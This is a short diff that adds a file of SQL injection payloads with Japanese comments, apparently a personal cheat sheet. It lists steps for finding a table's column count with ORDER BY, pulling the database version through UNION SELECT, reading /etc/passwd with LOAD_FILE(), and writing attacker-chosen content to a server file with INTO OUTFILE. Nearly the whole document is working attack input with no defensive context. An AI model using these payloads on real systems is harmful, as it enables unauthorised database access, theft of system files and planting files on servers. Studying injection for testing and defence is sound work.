@@ -1,0 +1,12 @@
+//カラム数の探知
+'orderby 1;-- - //数字を１ずつ増やす
+
+//バージン情報の列挙
+1' and 1=0 union select version(),null,null,null;-- -
+
+//LOAD_FILE()の利用
+'and 1=0 union select null,null,null,LOAD_FILE('/etc/passwd');-- -
+
+//INTO OUTFILEでファイルに出力
+1' and 1=0 union select "<html>hoge</html>","","","" INTO OUTFILE "<パス>";-- -
+
